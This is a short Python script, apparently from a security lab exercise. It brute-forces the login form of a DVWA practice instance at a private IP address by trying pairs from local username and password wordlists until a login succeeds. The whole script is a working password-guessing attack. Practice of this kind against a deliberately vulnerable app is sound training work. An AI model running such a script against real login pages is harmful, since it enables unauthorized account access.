import requests

# <form action="login.php" method="post">
# <fieldset>
# 		<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
# 		<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
# 		<p class="submit"><input type="submit" value="Login" name="Login"></p>
# </fieldset>
# </form>

URL = "http://10.0.2.6/dvwa/login.php"
data_dict = {"username": "", "password": "", "Login": "submit"}
username_list = "./files/usernames_small.txt"
password_list = "./files/passwords_small.txt"

try:
    with open(username_list, "r") as userlist:
        for line in userlist:
            user = line.strip()
            data_dict["username"] = user

            with open(password_list, "r") as wordlist:
                for line in wordlist:
                    word = line.strip()
                    data_dict["password"] = word
                    print(f"[+] Attempting login with username: {user}, password: {word}")
                    response = requests.post(URL, data=data_dict)
                    if "Login failed" not in response.content.decode():
                        print(f"[+] Login successful --> U:{user} P:{word}")
                        exit()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... terminating app, please wait.")

print(f"[-] No valid credentials found for: {URL}")
print("Goodbye!")
